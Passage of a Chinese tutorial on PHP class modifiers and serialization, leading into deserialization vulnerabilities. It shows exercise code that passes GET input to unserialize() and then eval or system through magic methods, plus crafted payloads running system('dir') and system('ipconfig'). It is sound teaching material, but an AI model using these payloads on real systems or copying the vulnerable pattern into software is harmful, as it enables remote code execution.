title="类的修饰符介绍"></a>类的修饰符介绍</h3><p>在类中直接声明的变量称为成员属性(也可以成为成员变量)</p><p>可以在类中声明多个变量，即“对象”中可以有多个成员属性，每个变量都存储“对象”不同的属性信息。</p><p>访问权限修饰符:对属性的定义</p><p>常用访问权限修饰符:</p><p>​public:公共的，在类的内部、子类中或者类的外部都可以使用，不受限制;</p><p>​protected:受保护的，在类的内部、子类中可以使用，但不能在类的外部使用;</p><p>​private:私有的，只能在类的内部使用，在类的外部或者子类中都无法使用。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">hero</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span>  <span class="variable">$name</span>=<span class="string">&#x27;chengyaojin&#x27;</span>; <span class="comment">//外部可用</span></span><br><span class="line">  <span class="keyword">private</span>  <span class="variable">$sex</span>=<span class="string">&#x27;man&#x27;</span>;<span class="comment">//外部不可用</span></span><br><span class="line">  <span class="keyword">protected</span>  <span class="variable">$shengao</span>=<span class="string">&#x27;165&#x27;</span>;<span class="comment">//外部不可用</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">jineng</span>(<span class="params"><span class="variable">$var1</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$var1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$cyj</span>= <span class="keyword">new</span> <span class="title function_ invoke__">hero</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$cyj</span>-&gt;name.<span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$cyj</span>-&gt;sex.<span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$cyj</span>-&gt;shengao.<span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">hero</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span>  <span class="variable">$name</span>=<span class="string">&#x27;chengyaojin&#x27;</span>;</span><br><span class="line">  <span class="keyword">private</span>  <span class="variable">$sex</span>=<span class="string">&#x27;man&#x27;</span>;</span><br><span class="line">  <span class="keyword">protected</span>  <span class="variable">$shengao</span>=<span class="string">&#x27;165&#x27;</span>;<span class="comment">//子类可用</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">jineng</span>(<span class="params"><span class="variable">$var1</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$var1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">hero2</span> <span class="keyword">extends</span> <span class="title">hero</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;name.<span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;sex.<span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;shengao.<span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$cyj</span>= <span class="keyword">new</span> <span class="title function_ invoke__">hero</span>();</span><br><span class="line"><span class="variable">$cyj2</span>=<span class="keyword">new</span> <span class="title function_ invoke__">hero2</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$cyj</span>-&gt;name.<span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$cyj2</span>-&gt;<span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240418233609469.png" alt="image-20240418233609469"></p><h1 id="序列化知识"><a href="#序列化知识" class="headerlink" title="序列化知识"></a>序列化知识</h1><h2 id="序列化的作用"><a href="#序列化的作用" class="headerlink" title="序列化的作用"></a>序列化的作用</h2><p>序列化 (Serialization)是将对象的状态信息(属性)转换为可以存储或传输的形式的过程。将对象或者数组转化为可储存&#x2F;传输的字符串。</p><p>演示:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TEST</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$data</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$data2</span> = <span class="string">&quot;dazzhuang&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$pass</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$data</span>, <span class="variable">$pass</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data = <span class="variable">$data</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;pass = <span class="variable">$pass</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$number</span> = <span class="number">34</span>;</span><br><span class="line"><span class="variable">$str</span> = <span class="string">&#x27;user&#x27;</span>;</span><br><span class="line"><span class="variable">$bool</span> = <span class="literal">true</span>;</span><br><span class="line"><span class="variable">$null</span> = <span class="literal">NULL</span>;</span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;a&#x27;</span> =&gt; <span class="number">10</span>, <span class="string">&#x27;b&#x27;</span> =&gt; <span class="number">200</span>);</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title function_ invoke__">TEST</span>(<span class="string">&#x27;uu&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line"><span class="variable">$test2</span> = <span class="keyword">new</span> <span class="title function_ invoke__">TEST</span>(<span class="string">&#x27;uu&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line"><span class="variable">$test2</span>-&gt;data = &amp;<span class="variable">$test2</span>-&gt;data2;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$number</span>).<span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$str</span>).<span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$bool</span>).<span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$null</span>).<span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$arr</span>).<span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$test</span>).<span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$test2</span>).<span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240418234413114.png" alt="image-20240418234413114"></p><p><img src="/../image/image-20240418234703813.png" alt="image-20240418234703813"></p><h2 id="数组序列化"><a href="#数组序列化" class="headerlink" title="数组序列化"></a>数组序列化</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">array</span>(<span class="string">&#x27;benben&#x27;</span>,<span class="string">&#x27;dazhuang&#x27;</span>,<span class="string">&#x27;laoliu&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240421150039939.png" alt="image-20240421150039939"></p><h2 id="对象序列化"><a href="#对象序列化" class="headerlink" title="对象序列化"></a>对象序列化</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$pub</span>=<span class="string">&#x27;benben&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">jineng</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;pub;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240421150229394.png" alt="image-20240421150229394"></p><h2 id="私有修饰符"><a href="#私有修饰符" class="headerlink" title="私有修饰符"></a>私有修饰符</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$pub</span>=<span class="string">&#x27;benben&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">jineng</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;pub;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>私有属性会在当前类加上类名，再加上%00，也就是null</strong></p><p><img src="/../image/image-20240421150636424.png" alt="image-20240421150636424"></p><p><img src="/../image/image-20240421150726683.png" alt="image-20240421150726683"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url编码：O%3A4%3A%22test%22%3A1%3A%7Bs%3A9%3A%22%00test%00pub%22%3Bs%3A6%3A%22benben%22%3B%7D</span><br></pre></td></tr></table></figure><h2 id="保护修饰符"><a href="#保护修饰符" class="headerlink" title="保护修饰符"></a>保护修饰符</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$pub</span>=<span class="string">&#x27;benben&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">jineng</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;pub;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240421151744954.png" alt="image-20240421151744954"></p><p>会多个星号，然后前后都有null，提交的时候要加%00*%00</p><h2 id="成员属性调用对象"><a href="#成员属性调用对象" class="headerlink" title="成员属性调用对象"></a>成员属性调用对象</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$pub</span>=<span class="string">&#x27;benben&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">jineng</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;pub;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test2</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$ben</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;ben=<span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test2</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240421151924120.png" alt="image-20240421151924120"></p><h1 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h1><p>1.反序列化之后的内容为一个对象;</p><p>2.反席列化生成的对象里的值，由反序列化里的值提供;与原有类预定义的值无关;</p><p>反序列化漏洞的成因:反序列化过程中，unserialize()接收的值(字符串)可控，得到所需要的代码，即生成的对象的属性值。通过更改这个值(字符串)，</p><p>3.反序列化不触发类的成员方法;需要调用方法后才能触发;</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$a</span> = <span class="string">&#x27;benben&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$b</span> = <span class="number">666</span>;</span><br><span class="line">    <span class="keyword">private</span>  <span class="variable">$c</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">displayVar</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$d</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="variable">$d</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$d</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$d</span>.<span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$d</span>).<span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">urlencode</span>(<span class="variable">$d</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$b</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240421152439469.png" alt="image-20240421152439469"></p><h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span> = <span class="string">&#x27;echo &quot;this is test!!&quot;;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">displayVar</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$get</span> = <span class="variable">$_GET</span>[<span class="string">&quot;benben&quot;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$get</span>);</span><br><span class="line"><span class="variable">$b</span>-&gt;<span class="title function_ invoke__">displayVar</span>() ;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span> = <span class="string">&#x27;echo &quot;this is test!!&quot;;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">displayVar</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">test</span>());</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240421161340530.png" alt="image-20240421161340530"></p><p>如果是要执行命令的话，比如ipconfig，可以利用以下代码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span> = <span class="string">&#x27;system(&quot;ipconfig&quot;);&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">displayVar</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">test</span>());</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240421161552271.png" alt="image-20240421161552271"></p><h2 id="魔术方法介绍，构造和析构"><a href="#魔术方法介绍，构造和析构" class="headerlink" title="魔术方法介绍，构造和析构"></a><strong>魔术方法介绍，构造和析构</strong></h2><p><strong>魔术方法</strong>：一个预定义好的，在特定情况下自动触发的行为方法。</p><p><strong>魔术方法的作用</strong>：</p><p>反序列化漏洞的成因:</p><p>反序列化过程中，unserialize()接收的值(字符串)可控;通过更改这个值(字符串)，得到所需要的代码，通过调用方法，触发代码执行。</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p><img src="/../image/image-20240421162047664.png" alt="image-20240421162047664"></p><p>先思考触发时机，再思考功能，再想会不会传参数，然后得出返回值</p><p><img src="/../image/image-20240421162221153.png" alt="image-20240421162221153"></p><h3 id="construct-、destruct-类的构建和析构函数"><a href="#construct-、destruct-类的构建和析构函数" class="headerlink" title="construct()、destruct 类的构建和析构函数"></a>construct()、destruct 类的构建和析构函数</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;触发了构造函数1次&quot;</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;benben&quot;</span>);</span><br><span class="line"><span class="variable">$ser</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$test</span>);</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$ser</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240421162514691.png" alt="image-20240421162514691"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)#在对象的所有引用被删除或者当对象被显式销毁时执行的魔术方法，在反序列化过程中会触发</span>;</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;触发了析构函数1次&quot;</span>.<span class="string">&quot;&lt;br /&gt;&quot;</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;benben&quot;</span>);</span><br><span class="line"><span class="variable">$ser</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$test</span>);</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$ser</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240421162659320.png" alt="image-20240421162659320"></p><p><strong>例题</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$cmd</span> = <span class="string">&quot;echo &#x27;dazhuang666!!&#x27;;&quot;</span> ;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span> (<span class="variable language_">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ser</span> = <span class="variable">$_GET</span>[<span class="string">&quot;benben&quot;</span>];</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$ser</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>构造，让cmd&#x3D;我们想要的指令就行</p><p>O:4:”User”:1:{s:3:”cmd”;s:14:”system(‘dir’);”;}</p><p><img src="/../image/image-20240421165300585.png" alt="image-20240421165300585"></p><h3 id="weakup-、sleep方法"><a href="#weakup-、sleep方法" class="headerlink" title="weakup()、sleep方法"></a>weakup()、sleep方法</h3><p><strong>__sleep()</strong></p><p>**序列化serialize()**函数会检査类中是否存在一个魔术方法_ seep()。</p><p>如果存在，该方法会先被调用，然后才执行序列化操作。</p><p>此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组。</p><p>如果该方法未返回任何内容，则 NULL被序列化，并产生一个ENOTICE级别的错误。</p><p>触发时机:序列化serialize()之前</p><p>功能:对象被序列化之前触发，返回需要被序列化存储的成员属性，删除不必要的属性。</p><p>参数:成员属性</p><p>返回值:需要被序列化存储的成员属性</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">SITE</span> = <span class="string">&#x27;uusama&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nickname</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$nickname</span>, <span class="variable">$password</span></span>)    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;nickname = <span class="variable">$nickname</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">&#x27;username&#x27;</span>, <span class="string">&#x27;nickname&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$user</span> = <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240421170502700.png" alt="image-20240421170502700"></p><p>可以发现password没有了，这是因为序列化调用了sleep，只返回了这两个值，我们把sleep注释掉看看结果。</p><p><img src="/../image/image-20240421182315566.png" alt="image-20240421182315566"></p><p>可以啊看到就有password了，且因为是private，前面还加上了类名和null</p><p><strong>例题</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">SITE</span> = <span class="string">&#x27;uusama&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nickname</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$nickname</span>, <span class="variable">$password</span></span>)    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;nickname = <span class="variable">$nickname</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;username);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;benben&#x27;</span>];</span><br><span class="line"><span class="variable">$user</span> = 